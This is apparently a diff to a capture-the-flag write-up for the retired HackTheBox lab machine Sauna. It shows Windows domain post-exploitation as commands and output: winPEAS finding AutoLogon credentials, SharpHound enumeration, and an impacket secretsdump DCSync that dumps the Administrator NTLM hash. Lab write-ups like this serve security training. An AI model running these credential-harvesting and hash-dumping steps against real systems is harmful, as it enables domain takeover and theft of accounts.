@@ -56,3 +56,43 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7ecf8fbf18e84a09d280104d2ac193f4$d22
 └─# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
 *Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
 1b5520b98d97cf17f24122a55baf70cf
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
+*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEASx64.exe
+  [+] Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> upload SharpHound.exe
+*Evil-WinRM* PS C:\Users\FSmith\Documents> dir
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/21/2021   8:35 AM           9065 20210621083512_BloodHound.zip
+-a----        6/21/2021   8:34 AM         833536 SharpHound.exe
+-a----        6/21/2021   8:24 AM        1678336 winPEASx64.exe
+-a----        6/21/2021   8:35 AM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20210621083512_BloodHound.zip
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+
+
+Priv Escalation
+https://blog.luckolen.xyz/posts/HTB/Sauna#fsmith---svc_loanmgr
+Query for principals with DCSync rights shows svc_loanmgr has DS-Replication-Get-Changes-All:
+Next action here is to run secrets dump module from impacket:
+└─# python secretsdump.py -just-dc-ntlm 'egotisticalbank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+egotisticalbank\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
+f3ee04965c68257382e31502cc5e881f
